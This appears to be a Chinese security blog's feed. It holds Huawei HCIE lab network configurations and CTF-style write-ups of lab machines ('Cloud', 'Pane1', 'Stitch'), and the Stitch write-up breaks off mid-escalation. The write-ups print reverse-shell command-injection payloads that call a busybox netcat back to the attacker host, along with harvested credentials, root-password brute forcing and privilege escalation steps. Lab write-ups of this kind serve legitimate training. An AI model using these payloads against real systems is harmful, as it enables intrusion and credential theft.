ip ip-prefix Employee deny 10.1.45.0 24

ip ip-prefix Employee deny 10.1.51.0 24
ip ip-prefix Employee deny 10.1.52.0 24
ip ip-prefix Employee deny 10.1.53.0 24
ip ip-prefix Employee deny 10.1.54.0 24
ip ip-prefix Employee deny 10.1.55.0 24

ip ip-prefix Employee permit 0.0.0.0 0 less-equal 32

ip ip-prefix Guest deny 10.1.101.0 24
ip ip-prefix Guest deny 10.1.102.0 24
ip ip-prefix Guest deny 10.1.103.0 24
ip ip-prefix Guest deny 10.1.104.0 24
ip ip-prefix Guest deny 10.1.105.0 24

ip ip-prefix Guest permit 0.0.0.0 0 less-equal 32

ospf 1
a 1
filter ip-prefix Guest imp
q
a 2
filter ip-prefix Employee imp
nssa
q
q
ospf 3
a 2
nssa
q
q
```

## X_T1_FW1

```
ospf 2
a 2
nssa
q
q
```

## 检查

![image-20250812161934561](http://7r1UMPHK.github.io/image/20250813214104057.webp)

![image-20250812170719317](http://7r1UMPHK.github.io/image/20250813214102133.webp)

# 9 出口网络配置

## X_T1_Export1

```
----这里的是预配的，只是我这拓扑没有----
ip rou 0.0.0.0 0.0.0.0 10.255.1.254
ip rou 0.0.0.0 0.0.0.0 10.255.2.254
acl 2000
rule 5 permit
quit
int g0/0/0
nat out 2000
int g0/0/1
nat out 2000
q
-----------------------------------
acl 2000
undo rule 5
rule permit sou 10.1.11.0 0.0.0.255
rule permit sou 10.1.12.0 0.0.0.255
rule permit sou 10.1.13.0 0.0.0.255
rule permit sou 10.1.14.0 0.0.0.255
rule permit sou 10.1.15.0 0.0.0.255

rule permit sou 10.1.21.0 0.0.0.255
rule permit sou 10.1.22.0 0.0.0.255
rule permit sou 10.1.23.0 0.0.0.255
rule permit sou 10.1.24.0 0.0.0.255
rule permit sou 10.1.25.0 0.0.0.255

rule permit sou 10.1.51.0 0.0.0.255
rule permit sou 10.1.52.0 0.0.0.255
rule permit sou 10.1.53.0 0.0.0.255
rule permit sou 10.1.54.0 0.0.0.255
rule permit sou 10.1.55.0 0.0.0.255

rule permit sou 10.1.101.0 0.0.0.255
rule permit sou 10.1.102.0 0.0.0.255
rule permit sou 10.1.103.0 0.0.0.255
rule permit sou 10.1.104.0 0.0.0.255
rule permit sou 10.1.105.0 0.0.0.255
q
```

## 检查

![image-20250813093949534](http://7r1UMPHK.github.io/image/20250813214100032.webp)

## X_T1_Export2

```
ip rou 0.0.0.0 0.0.0.0 10.255.3.254
ip rou 0.0.0.0 0.0.0.0 10.255.4.254
nat address-group 1 10.255.4.2 10.255.4.100
acl 2000
rule permit sou 10.1.11.0 0.0.0.255
rule permit sou 10.1.12.0 0.0.0.255
rule permit sou 10.1.13.0 0.0.0.255
rule permit sou 10.1.14.0 0.0.0.255
rule permit sou 10.1.15.0 0.0.0.255

rule permit sou 10.1.21.0 0.0.0.255
rule permit sou 10.1.22.0 0.0.0.255
rule permit sou 10.1.23.0 0.0.0.255
rule permit sou 10.1.24.0 0.0.0.255
rule permit sou 10.1.25.0 0.0.0.255

rule permit sou 10.1.51.0 0.0.0.255
rule permit sou 10.1.52.0 0.0.0.255
rule permit sou 10.1.53.0 0.0.0.255
rule permit sou 10.1.54.0 0.0.0.255
rule permit sou 10.1.55.0 0.0.0.255

rule permit sou 10.1.101.0 0.0.0.255
rule permit sou 10.1.102.0 0.0.0.255
rule permit sou 10.1.103.0 0.0.0.255
rule permit sou 10.1.104.0 0.0.0.255
rule permit sou 10.1.105.0 0.0.0.255
q

int g0/0/0
nat out 2000
int g0/0/1
nat server protocol tcp global current-int 8081 ins 10.1.60.101 80
nat out 2000 address-group 1
q
```

## 实现回程流量转发

### Core

```
acl 3001
rule permit ip sou 10.1.60.101 0
int vlan 204
----------这条模拟器做不了，你可以写个描述记忆一下----------
traffic-rediect inbound acl 3001 ip-nexthop 10.1.200.5
-----------------------------------------------------
q
```

### X_T1_Export2

```
acl 3001
rule permit ip sou 10.1.60.101 0
traffic classifier web
if-match acl 3001
traffic behavior web
redirect ip-nexthop 10.255.4.254
traffic policy web
classifier web behavior web
int vlan 202
traffic-policy web inbound
q
```

# 10 WLAN扩展需求

*ps:考试的时候，每个人的AC预配模板名字是不一样的。*

这是我的预配模板，只是提供参照。

```
wlan
 traffic-profile name default
 security-profile name default
 security-profile name X_Guest
  security wpa-wpa2 psk pass-phrase %^%#81*JKo7&lt;}DcIVzR3Lz/4(:!R=HMpVT3P^*XG[dCB
%^%# aes
 security-profile name X_Employee
  security wpa-wpa2 psk pass-phrase %^%#i#Ou6&amp;},h,-1.CNu{`N:K''qIaQs&gt;%G$+(WxjCy'
%^%# aes
 security-profile name default-wds
 security-profile name X_GEmployee
 security-profile name default-mesh
 ssid-profile name default
 ssid-profile name X_Guest
  ssid X_Guest
 ssid-profile name X_Employee
  ssid X_Employee
 vap-profile name default
 vap-profile name X_Guest
  service-vlan vlan-id 32
  ssid-profile X_Guest
  security-profile X_Guest
 vap-profile name X_Employee
  service-vlan vlan-id 31
  ssid-profile X_Employee
  security-profile X_Employee
 wds-profile name default
 mesh-handover-profile name default
 mesh-profile name default
 regulatory-domain-profile name default
 air-scan-profile name default
 rrm-profile name default
 radio-2g-profile name default
 radio-5g-profile name default
 wids-spoof-profile name default
 wids-profile name default
 wireless-access-specification
 ap-system-profile name default
 port-link-profile name default
 wired-port-profile name default
 serial-profile name preset-enjoyor-toeap 
 ap-group name default
 ap-group name ap-group1
  radio 0
   vap-profile X_Employee wlan 1
  radio 1
   vap-profile X_Guest wlan 2
 ap-id 0 type-id 69 ap-mac 00e0-fc14-40d0 ap-sn 2102354483104B292D16
  ap-name X_T1_AP1
  ap-group ap-group1
 provision-ap
#
return
```

## 10.1 新增 X_T2_AP1

&gt; [!TIP]
&gt;
&gt; ap mac可以通过 dis arp查看，lldp也可以看

```
un capwap source ip-address
capwap source interface Vlanif 100
wlan
-----这里的考试有，但是我预配没有，所以我自己配-----
ap-group name X
vap-profile X_Employee wlan 1 radio all
vap-profile X_Guest wlan 2 radio all
q
vap-profile name X_Employee
service-vlan vlan-pool Employee
y
forward-mode tunnel
y
q
vap-profile name X_Guest
service-vlan vlan-pool Guest
y
forward-mode tunnel
y
q
-------------------------------------------
ap-id 0
ap-group X
y
q
ap-id 1 ap-mac 00e0-fc66-08b0
ap-name X_T2_AP1
ap-group X
y
q
```

如果不脸黑的话，一会就可以看到上线成功了

![image-20250813105950024](http://7r1UMPHK.github.io/image/20250813214056465.webp)

然后根据你桌子上的小纸纸，改密码，我这只是演示

```
security-profile name X_Employee
security wpa-wpa2 psk pass-phrase Huawei@001 aes
y
security-profile name X_Guest
security wpa-wpa2 psk pass-phrase Huawei@001 aes
y
```

测试能连上就好了

![image-20250813110553953](http://7r1UMPHK.github.io/image/20250813214054634.webp)

# 11 准入认证

*ps:这里只有一部分可以配置，所以不用过多纠结，可以先练习一下，然后上真机配置*

## X_T1_AGG1/X_T2_AGG1

### radius 模板

没有多执行，那我们就练习一个就好了

```
radius-server template Employee
radius-server authentication 10.1.60.2 1812
radius-server shared-key cipher Huawei@123
q
radius-server authorization 10.1.60.2 shared-key cipher Huawei@123
```

### AAA

```
aaa
authentication-scheme Employee
authentication-mode radius 
q
accounting-scheme Employee
accounting-mode radius
q
authentication-scheme ap_noauthen
authentication-mode none
q
```

### 认证域

```
domain employee
authentication-scheme Employee
radius-server Employee
q
domain ap_noauthen
authentication-scheme ap_noauthen
q
```

### AP认证域绑定MAC（ensp做不了）

```
domain ap_noauthen mac-authen force mac-address 'AP的MAC地址' mask ffff-fffr-fff
```

### 接入模板（ensp做不了）

```
dotlx-access-profile name Employee
mac-access-profile name Employee
```

### 认证模板（ensp做不了）

```
authentication-profile name Employee
dotlx-access-profile Employee
mac-access-profile Employee
authentication dotlx-mac-bypass
access-domain employee force
```

### 接口开认证（ensp做不了）

也是两个都要，我这只演示一个

*ps:聚合口是使用下联的聚合空，灵活应用*

```
int eth-trunk 2
authentication-profile Employee
int eth-truink 3
authentication-profile Employee
```

## 全ACC透传（全部acc都需要配置）

```
l2protocol-tunnel user-defined-protocol 802.1x protocol-mac 0180-c200-0003 group-mac 0100-0000-0002
```

### 接口绑定802.1X认证（全部acc都需要配置）

```
int rang g 0/0/1 to g0/0/20           
//这条ensp不支持，ensp可以使用 p g g0/0/1 to g0/0/20
l2protocol-tunnel user-defined-protocol 802.1x enable
q
interface Eth-Trunk 1             //上联聚合口
l2protocol-tunnel user-defined-protocol 802.1x enable
```

# 12 网络安全需求

## 12.1 vsys Employee配置

### 12.1.1 地址集

#### X_T1_FW1

```
switch vsys Employee
sy
ip address-set market type group
address 10.1.11.0 mask 24
address 10.1.12.0 mask 24
address 10.1.13.0 mask 24
address 10.1.14.0 mask 24
address 10.1.15.0 mask 24

ip address-set procure type group
address 10.1.21.0 mask 24
address 10.1.22.0 mask 24
address 10.1.23.0 mask 24
address 10.1.24.0 mask 24
address 10.1.25.0 mask 24

ip address-set wlan type group
address 10.1.51.0 mask 24
address 10.1.52.0 mask 24
address 10.1.53.0 mask 24
address 10.1.54.0 mask 24
address 10.1.55.0 mask 24

ip address-set hr-finance type group
address 10.1.31.0 mask 24
address 10.1.32.0 mask 24
address 10.1.33.0 mask 24
address 10.1.34.0 mask 24
address 10.1.35.0 mask 24
address 10.1.41.0 mask 24
address 10.1.42.0 mask 24
address 10.1.43.0 mask 24
address 10.1.44.0 mask 24
address 10.1.45.0 mask 24

ip address-set X-Y-Z type group
address 10.3.101.0 mask 24
address 10.100.2.0 mask 24
address 10.2.31.0 mask 24
address 10.2.32.0 mask 24
address 10.2.33.0 mask 24
address 10.2.34.0 mask 24
address 10.2.35.0 mask 24
address 10.2.41.0 mask 24
address 10.2.42.0 mask 24
address 10.2.43.0 mask 24
address 10.2.44.0 mask 24
address 10.2.45.0 mask 24
address 10.2.51.0 mask 24
address 10.2.52.0 mask 24
address 10.2.53.0 mask 24
address 10.2.54.0 mask 24
address 10.2.55.0 mask 24
q
quit
quit
```

### 12.1.2 重定向内部无线访问服务器流量

#### X_T1_Core1

```
acl number 3000
rule permit ip source 10.1.51.0 0.0.0.255 destination 10.1.60.0 0.0.0.255
rule permit ip source 10.1.52.0 0.0.0.255 destination 10.1.60.0 0.0.0.255
rule permit ip source 10.1.53.0 0.0.0.255 destination 10.1.60.0 0.0.0.255
rule permit ip source 10.1.54.0 0.0.0.255 destination 10.1.60.0 0.0.0.255
rule permit ip source 10.1.55.0 0.0.0.255 destination 10.1.60.0 0.0.0.255
q
interface g0/0/3
# ensp加不了实例，所以想配就配，不配就算了
trafiic-redirect inbound acl 3000 vpn-ins Employee ip-nexthop 10.1.200.22
q
```

### 12.1.3 安全策略

#### X_T1_FW1

```
switch vsys Employee
sy
security-policy
rule name permit60.101
source-zone untrust
destination-zone trust
destination-address 10.1.60.101 mask 255.255.255.255
service http
action permit
q

rule name perimit60.100
source-zone trust
destination-zone trust
source-address address-set wlan
destination-address 10.1.60.100 mask 255.255.255.255
action permit
q

rule name deny60.0
source-zone trust
destination-zone trust
source-address address-set wlan
destination-address 10.1.60.100 mask 255.255.255.255
action deny
q

rule name Z-Y-X
source-zone untrust
source-zone trust
destination-zone untrust
destination-zone trust
source-address address-set X-Y-Z
source-address address-set market procure hr-finance wlan
destination-address address-set market procure hr-finance wlan
destination-address address-set X-Y-Z
action permit
q

rule name permitany
source-zone trust
destination-zone untruist
source-address address-set wlan
source-address address-set market
source-address address-set procure
action permit
q
q
quit
quit
```

![image-20250813160936283](http://7r1UMPHK.github.io/image/20250813214050584.webp)

![image-20250813161001465](http://7r1UMPHK.github.io/image/20250813214049075.webp)

## 12.2 vsys Guest

### 12.2.1 地址集

```
switch vsys Guest
sy
ip address-set Guest type group
address 10.1.101.0 mask 24
address 10.1.102.0 mask 24
address 10.1.103.0 mask 24
address 10.1.104.0 mask 24
address 10.1.105.0 mask 24
q
```

### 12.2.2 安全策略

#### 服务集

```
ip service-set Guest_Service type object 16
service 0 protocol tcp destination-port 3389
q
```

#### 安全策略

```
security-policy
rule name permit60.99
source-zone trust
destination-zone untrust
source-address address-set Guest
destination-address 10.1.60.99 mask 255.255.255.255
service Guest_Service
action permit
q

rule name deny60.0_Y_Z
source-zone trust
destination-zone untrust
source-address address-set Guest
destination-address 10.1.60.0 mask 255.255.255.0
destination-address 10.10.0.0 mask 255.255.0.0
destination-address 10.100.0.0 mask 255.255.0.0
destination-address 10.2.0.0 mask 255.255.0.0
destination-address 10.3.0.0 mask 255.255.0.0
action deny
rule name permitany
source-zone trust
destination-zone untrust
source-address address-set Guest
action permit
q
```

![image-20250813160805716](http://7r1UMPHK.github.io/image/20250813214046853.webp)

## 12.3 vsys 之间的转发

### Employee

```
switch vsys Employee
sy
interface Virtual-if1
ip address 10.1.200.253 255.255.255.255
q
firewall zone untrust
add interface Virtual-if1
q
quit
quit
```

### Guest

```
switch vsys Guest
sy
interface Virtual-if2
ip address 10.1.200.254 255.255.255.255
q
firewall zone untrust
add interface Virtual-if2
q
quit
quit
```

### 公共

```
ip route-static vpn-instance Guest 10.1.60.99 255.255.255.255 vpn-instance Employee
ip route-static vpn-instance Employee 10.1.101.0 255.255.255.0 vpn-instance Guest
ip route-static vpn-instance Employee 10.1.102.0 255.255.255.0 vpn-instance Guest
ip route-static vpn-instance Employee 10.1.103.0 255.255.255.0 vpn-instance Guest
ip route-static vpn-instance Employee 10.1.104.0 255.255.255.0 vpn-instance Guest
ip route-static vpn-instance Employee 10.1.105.0 255.255.255.0 vpn-instance Guest
```

### Employee

```
ip address-set Guest type group
address 10.1.101.0 mask 24
address 10.1.102.0 mask 24
address 10.1.103.0 mask 24
address 10.1.104.0 mask 24
address 10.1.105.0 mask 24
q

ip service-set Guest_Service type object 17
service 0 protocol tcp destination-port 3389
q

security-policy
rule name permit60.99
source-zone untrust
destination-zone trust
source-address address-set Guest
destination-address 10.1.60.99 mask 255.255.255.255
service Guest_Service
action permit
```

# 验证

先把FW1的icmp打开

```
icmp ttl-exceeded send
```

![image-20250813162920742](http://7r1UMPHK.github.io/image/20250813214044313.webp)

![image-20250813163121733](http://7r1UMPHK.github.io/image/20250813214042640.webp)

![image-20250813163304351](http://7r1UMPHK.github.io/image/20250813214038287.webp)sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/HCIE-Q1.html</guid><pubDate>Wed, 13 Aug 2025 13:42:18 +0000</pubDate></item><item><title>内部_Cloud</title><link>https://7r1UMPHK.github.io/post/nei-bu-_Cloud.html</link><description># 一、信息收集

## 1. 主机发现

首先，使用 `arp-scan` 在 `192.168.205.0/24` 网段中发现目标主机。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo arp-scan -l
...
192.168.205.142 08:00:27:0f:75:63       PCS Systemtechnik GmbH
...
```

确认目标主机IP地址为 `192.168.205.142`。

## 2. 端口扫描与服务探测

使用 `nmap` 对目标主机进行全端口扫描，识别开放的服务。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap -p- 192.168.205.142
...
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
666/tcp   open  doom
9443/tcp  open  tungsten-https
9455/tcp  open  unknown
65443/tcp open  unknown
...
```

扫描发现多个开放端口。其中 `9455` 端口运行着一个未知的“Admin Service”，这通常是值得优先探索的突破口。使用 `netcat` 连接该服务进行交互。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nc 192.168.205.142 9455
Welcome to Admin Service
Type 'help' for available commands
Available commands:
  help          - Show this help
  whoami        - Show current user
  system-status - Show system status
  exit          - Disconnect
```

在交互式Shell中输入 `help`，发现一个隐藏的命令 `show-admin-pass`。

```bash
help
Available commands:
  help          - Show this help
  whoami        - Show current user
  system-status - Show system status
  show-admin-pass - Show admin password
  exit          - Disconnect
show-admin-pass
Admin Password: 5jRrRnE9
```

成功获取到一个管理员密码 `5jRrRnE9`。根据端口扫描结果，`9443` 端口运行着一个雷池WAF，推测该密码是WAF的登录凭证。

# 二、Web渗透与立足点

## 1. 绕过WAF防护

访问 `https://192.168.205.142:9443`，进入雷池WAF的登录页面。使用用户名 `admin` 和上一步获取的密码 `5jRrRnE9` 成功登录。

在WAF的管理后台中，发现其防护了一个Web应用，但该应用当前处于“维护模式”。这是导致直接访问80端口页面异常的原因。

我们将防护模式从“维护”切换为“观察”，使Web应用恢复正常访问。

![image-20250813213042337](http://7r1UMPHK.github.io/image/20250813213325461.webp)

## 2. 命令注入与Getshell

重新访问 `http://192.168.205.142`，页面显示为一个服务器状态检查工具。页面中存在一个“自定义命令”的输入点，暗示可能存在命令注入漏洞。

我们在此处直接构造反弹Shell的Payload，并用 `nc` 在Kali攻击机上进行监听。

* **Payload**: `busybox nc 192.168.205.128 8888 -e /bin/bash`

* **Kali监听**:

  ```bash
  ┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
  └─$ nc -lvnp 8888
  listening on [any] 8888 ...
  connect to [192.168.205.128] from (UNKNOWN) [192.168.205.142] 37450
  id
  uid=33(www-data) gid=33(www-data) groups=33(www-data)
  ```

成功接收到反弹Shell，获得 `www-data` 用户权限。

* **稳定Shell:**

  ```bash
  script /dev/null -c bash
  Ctrl+Z
  stty raw -echo; fg
  reset xterm
  export TERM=xterm
  export SHELL=/bin/bash
  stty rows 24 columns 80
  ```

# 三、权限提升

## 1. 横向移动 (www-data -&gt; lucky)

在 `www-data` 的Shell中进行信息收集，在 `/data/safeline/` 目录下发现一个敏感的环境变量配置文件 `.env`。

```bash
www-data@Cloud:/tmp$ cat /data/safeline/.env
SAFELINE_DIR=/data/safeline
POSTGRES_PASSWORD=vivrdIDj6fhNJIRdnitL
MGT_PORT=9443
RELEASE=
CHANNEL=
REGION=
IMAGE_PREFIX=swr.cn-east-3.myhuaweicloud.com/chaitin-safeline
IMAGE_TAG=9.2.1
SUBNET_PREFIX=192.168.0
ARCH_SUFFIX=
```

该文件泄露了一个PostgreSQL数据库密码 `vivrdIDj6fhNJIRdnitL`。考虑到密码复用的可能性，尝试使用此密码切换到系统中的其他用户。

```bash
www-data@Cloud:/tmp$ su lucky
Password: vivrdIDj6fhNJIRdnitL
lucky@Cloud:/home$ id
uid=1000(lucky) gid=1000(lucky) groups=1000(lucky)
```

成功使用该密码切换到 `lucky` 用户，完成了横向移动。

## 2. 提权至root (lucky -&gt; root)

在 `lucky` 用户的家目录下，发现一个名为 `.hint` 的提示文件。

```bash
lucky@Cloud:~$ cat .hint
root password length is 4.
Regex is : 'r..o'
```

提示信息给出了 `root` 密码的格式：长度为4，且符合正则表达式 `'r..o'`。我们可以据此生成一个密码字典，然后进行爆破。

1. **生成字典**：

   ```bash
   lucky@Cloud:~$ for a in {a..z}; do for b in {a..z}; do echo 'r${a}${b}o'; done; done &gt; /tmp/pass
   ```

2. **暴力破解**：
   使用 `su` 爆破脚本（如 `suForce`）和生成的字典对 `root` 账户进行密码猜解。

   ```bash
   lucky@Cloud:/tmp$ ./suForce -u root -w pass
   ...
   💥 Password | rooo
   ...
   ```

   成功破解出 `root` 用户的密码为 `rooo`。

3. **切换至root**：

   ```bash
   lucky@Cloud:/tmp$ su -
   Password: rooo
   root@Cloud:~# id
   uid=0(root) gid=0(root) groups=0(root)
   ```

   成功获得root权限。

# 四、获取Flag

现在拥有了root权限，可以读取所有的Flag。

```bash
root@Cloud:~# cat /root/root.txt
flag{root-74cc1c60799e0a786ac7094b532f01b1}

root@Cloud:~# cat /home/lucky/user.txt
flag{user-72cfd272ace172fa35026445fbef9b03}
```

所有Flag均已找到，渗透测试完成。sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_Cloud.html</guid><pubDate>Wed, 13 Aug 2025 13:34:20 +0000</pubDate></item><item><title>内部_Pane1</title><link>https://7r1UMPHK.github.io/post/nei-bu-_Pane1.html</link><description># 一、信息收集

## 1. 主机发现

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo arp-scan -l                           
...
192.168.205.132 08:00:27:e2:db:af       PCS Systemtechnik GmbH
...
```

确认目标主机IP地址为 `192.168.205.132`。

## 2. 端口扫描

使用 `nmap` 对目标主机进行全端口扫描，识别开放的服务。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap -p- 192.168.205.132            
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-12 09:24 EDT
Nmap scan report for 192.168.205.132
Host is up (0.00018s latency).
Not shown: 65532 closed tcp ports (reset)
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
38415/tcp open  unknown
MAC Address: 08:00:27:E2:DB:AF (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.10 seconds
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap -p38415 -sC -sV 192.168.205.132
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-12 09:26 EDT
Nmap scan report for 192.168.205.132
Host is up (0.00032s latency).

PORT      STATE SERVICE VERSION
38415/tcp open  http    Golang net/http server
|_http-title: \xE6\x9A\x82\xE6\x97\xB6\xE6\x97\xA0\xE6\xB3\x95\xE8\xAE\xBF\xE9\x97\xAE
| fingerprint-strings: 
|   GenericLines: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest, HTTPOptions: 
|     HTTP/1.0 200 OK
|     Content-Type: text/html; charset=utf-8
|     Set-Cookie: panel_public_key=LS0tLS1C...
```

扫描结果显示开放了 **22 (SSH)**, **80 (HTTP)**, 和 **38415** 三个端口。对38415端口的进一步扫描显示它是一个Golang的HTTP服务。

## 3. Web目录扫描

使用 `gobuster` 对80端口的Web服务进行目录爆破，发现几个标准PHP页面。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ gobuster dir -u http://192.168.205.132 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html
...
/index.php            (Status: 200)
/logout.php           (Status: 302)
/dashboard.php        (Status: 302)
...
```

# 二、Web渗透与立足点

# 1. 后台登录爆破

访问 `http://192.168.205.132` 是一个登录面板。38415是1Panel ，但是显示“无法访问，当前环境已经开启了安全入口登录”，我还以为是打CVE-2025-54424，但是看了一下，这个漏洞需要https请求，确切的说是tls通信，但是我们的请求是http的，所以暂时不管。

那就简单的爆破一下80 web的密码，输入了几个常见的用户admin,root,guest,test，爆破没收获，但是发现了一点问题，它爆破的很快，那我用户名那里就直接使用burp的用户名列表，然后密码使用5000q.txt（rockyou前5000行）

![image-20250812213450561](http://7r1UMPHK.github.io/image/20250812221133339.webp)

成功爆破出一组凭证：

*   **用户名**: `administrator`
*   **密码**: `123456`

## 2. 信息泄露与横向移动

使用上述凭证登录后台，在仪表盘页面发现关键信息。页面提示1Panel其安全访问路径：`/122b059247/`

此外，页面还提供了一个数据包文件供下载。这我熟啊:)

![image-20250812213735688](http://7r1UMPHK.github.io/image/20250812221138105.webp)

访问 `http://192.168.205.132:38415/122b059247/`，确认是一个1Panel的登录界面。尝试了几个弱密码，无果，下载抓包查看。

## 3. 数据包分析

下载后台提供的数据包文件，并使用Wireshark进行分析。先尝试过滤`tcp.port == 38415`没结果，然后通过字符串搜索功能查找关键字，选择 'Packet bytes' 和 'String' 搜索'password'，成功发现了三组登录凭证：

*   `root:root`
*   `admin:admin`
*   `root:superpassword123`

使用最后一组凭证 `root:superpassword123` 成功登录1Panel后台。

# 三、权限提升

## 1. 利用1Panel获取Root权限

1Panel类似的运维面板，通常是root用户在跑，我本身说一步到位，直接使用终端功能的，但是它居然找我要密码，我哪来的密码给你⁉

那我们利用SSH密钥管理功能来获取私钥吧。

进入1Panel后台，导航至 **系统 &gt; SSH管理 &gt; 密钥认证**，生成密钥，然后ctrl+c，ctrl+v

```bash
┌──(kali㉿kali)-[/tmp]
└─$ vim id_rsa 
                                                                                   
┌──(kali㉿kali)-[/tmp]
└─$ chmod 600 id_rsa                
                                                                                   
┌──(kali㉿kali)-[/tmp]
└─$ ssh root@192.168.205.132 -i id_rsa
Linux Pane1 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64
...
Last login: Mon Aug 11 08:47:18 2025 from 192.168.3.94
root@Pane1:~# id
uid=0(root) gid=0(root) groups=0(root)
```

# 四、获取Flag

```bash
root@Pane1:~# cat /root/root.txt
flag{root-e07910a06a086c83ba41827aa00b26ed}

root@Pane1:~# cat /home/kaada/user.txt
flag{user-ef68ba312de0daa3dd200a3f9275a6f6}
```

没啥好说的，low中lowsentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_Pane1.html</guid><pubDate>Tue, 12 Aug 2025 14:22:11 +0000</pubDate></item><item><title>内部_Stitch</title><link>https://7r1UMPHK.github.io/post/nei-bu-_Stitch.html</link><description># 一、信息收集

## 1. 主机发现

使用 `arp-scan` 对本地网段 `192.168.205.0/24` 进行扫描，发现目标主机。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo arp-scan -l
...
192.168.205.131 08:00:27:41:c8:f0       PCS Systemtechnik GmbH
...
```

确认目标IP地址为 `192.168.205.131`。

## 2. 端口扫描

使用 `nmap` 对目标主机进行全端口扫描，识别其开放的服务。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap -p- 192.168.205.131
...
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
...
```

扫描结果显示目标开放了 **22 (SSH)** 和 **80 (HTTP)** 端口。

## 3. 子域名枚举

访问 `http://192.168.205.131`，在页面页脚发现一个联系邮箱 `support@stitch.dsz`。由此推断出主域名为 `stitch.dsz`。

我们将IP与主域名绑定在本地 `/etc/hosts` 文件中。

```bash
192.168.205.131 stitch.dsz
```

随后，使用 `wfuzz` 对主域名进行虚拟主机（VHost）爆破，发现了多个子域名。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ wfuzz -c -u 'http://stitch.dsz' -H 'HOST:FUZZ.stitch.dsz' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --hw 1348
...
=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================
000000002:   200        60 L     163 W      1822 Ch     'mail - mail'
000004858:   200        61 L     132 W      1751 Ch     'dog - dog'
000049948:   200        225 L    549 W      7295 Ch     'iot - iot'
...
```

发现 `mail.stitch.dsz`, `dog.stitch.dsz`, 和 `iot.stitch.dsz` 三个子域名。将它们全部添加到 `/etc/hosts` 文件中以方便后续访问。

## 4. Web应用分析

经过对每个已发现子域的目录枚举和初步测试，我们将其关键特征和潜在攻击面总结如下：

*   **dog.stitch.dsz**: 一个图片上传页面。通过目录爆破发现 `/backup.zip`，源码分析表明其存在严格的MIME类型校验和图像二次渲染，难以直接利用上传漏洞。
*   **mail.stitch.dsz**: 一个静态邮件页面。目录爆破发现 `mail.php`，访问后发现该页面硬编码了对 `/etc/passwd` 文件的读取，导致了系统用户名列表的泄露。这并非通用文件读取漏洞，但为我们提供了关键的枚举信息。
*   **iot.stitch.dsz**: 一个物联网（IoT）设备登录面板。经过测试，此处的登录表单存在**命令注入**漏洞，是我们的主要突破口。

# 二、立足点

## 1. 命令注入漏洞

`iot.stitch.dsz` 的登录页面后端处理用户输入时未做严格过滤，导致在 `username` 参数中可以注入任意系统命令。

## 2. 获取反向Shell

我们利用该命令注入漏洞，让目标主机执行一条反弹shell的命令。

* **步骤一：在Kali攻击机上监听端口**

  ```bash
  ┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
  └─$ nc -lvnp 8888
  ```

* **步骤二：构造并发送Payload**
  在 `iot` 登录页面的 `username` 输入框中填入以下经过URL编码的Payload，密码任意填写后提交。

  ```
  ;busybox nc 192.168.205.128 8888 -e $(which $(echo $0));
  ```

* **步骤三：成功接收Shell**
  Kali的监听端口成功接收到来自目标服务器的反向shell，当前用户为 `www-data`。

  ```bash
  listening on [any] 8888 ...
  connect to [192.168.205.128] from (UNKNOWN) [192.168.205.131] 60340
  id
  uid=33(www-data) gid=33(www-data) groups=33(www-data)
  ```

* **步骤四：稳定Shell**

  ```bash
  script /dev/null -c bash
  Ctrl+Z
  stty raw -echo; fg
  reset xterm
  export TERM=xterm
  export SHELL=/bin/bash
  stty rows 24 columns 80
  ```

# 三、权限提升

## 1. 横向移动 (www-data -&gt; iiiii)

在 `www-data` 用户的shell中，我们对Web目录进行探查，在 `dog` 子站点的配置文件中发现关键信息。

```bash
www-data@Stitch:/var/www/dog$ cat config.php
&lt;?php
/*
 * IoT System Configuration File
 * Security Key: iiiii:3c4900896d92da
 * Last Updated: 2023-10-15
 */
// ... (其他配置)
?&gt;
```

`config.php` 文件泄露了一个格式为 `username:password` 的安全密钥：`iiiii:3c4900896d92da`。

使用此凭据，我们成功从 `www-data` 切换到 `iiiii` 用户，并获取了第一个flag。

```bash
www-data@Stitch:/var/www/dog$ su iiiii
Password: 3c4900896d92da
iiiii@Stitch:/var/www/dog$ id
uid=1000(iiiii) gid=1000(iiiii) groups=1000(iiiii)
iiiii@Stitch:~$ cat /home/iiiii/user.txt
flag{user-265620fc-3eda-11f0-b71d-000c2955ba04}
```

## 2. 提权至Root (iiiii -&gt; iotuser -&gt; root)

这是一个多步骤的提权过程，需要结合两个用户的权限和系统配置才能完成。

* **步骤一：权限分析 (iiiii)**
  在 `iiiii` 用户下，使用 `sudo -l` 发现其可以无密码以root权限执行 `/usr/bin/push_iot`。通过 `strings` 分析该程序，得知其功能是将一个文件复制到 `/var/iot_scripts/` 目录，但要求源文件所有者必须是 `iotuser`，且权限为 `600`，拒绝软链。这个限制条件迫使我们必须先获得 `iotuser` 的控制权。

